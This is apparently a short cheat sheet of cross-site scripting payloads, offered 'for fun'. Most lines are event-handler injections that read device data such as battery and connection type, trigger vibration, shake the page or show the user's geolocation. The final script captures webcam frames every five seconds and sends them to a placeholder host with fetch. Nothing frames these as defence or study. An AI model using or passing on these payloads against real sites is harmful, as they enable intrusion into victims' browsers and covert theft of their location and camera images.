**Basic payloads 4FUN**
```
<body onorientationchange=alert(orientation)>
<html ontouchstart=alert(1)>
<html ontouchend=alert(1)>
<html ontouchmove=alert(1)>
<html ontouchcancel=alert(1)>
<svg onload=alert(navigator.connection.type)>
<svg onload=alert(navigator.battery.level)>
<svg onload=alert(navigator.battery.dischargingTime)>
<svg onload=alert(navigator.battery.charging)>
open(c2.canvas.toDataURL())
<svg onload=navigator.vibrate(500)>
<svg onload=navigator.vibrate([500,300,100])>
```
**Shaking Firefox**
```
%27;setInterval%28x=>%7Bb=document.body.style,b.marginTop=%28b.marginTop==%274px%27%29?%27-4px%27:%274px%27;%7D,5%29//
```
**Geolocation popup**
```
<script>
navigator.geolocation.getCurrentPosition(function(p){
alert('Latitude:'%2Bp.coords.latitude+',Longitude:'%2B
p.coords.longitude%2B',Altitude:'%2Bp.coords.altitude);})
</script>
```
**Victim’s permission we can even take screenshots of his/her camera and send to a server(Chrome)**
```
<script>
d=document;
v=d.createElement(‘video’);
c=d.createElement(‘canvas’);
c.width=640;
c.height=480;
navigator.webkitGetUserMedia({‘video’:true},function(s){
v.src=URL.createObjectURL(s);v.play()},function(){});
c2=c.getContext(‘2d’);
x=’c2.drawImage(v,0,0,640,480);fetch(“//HOST/”+c2.canvas.toDataURL())‘;
setInterval(x,5000);
</script>
```
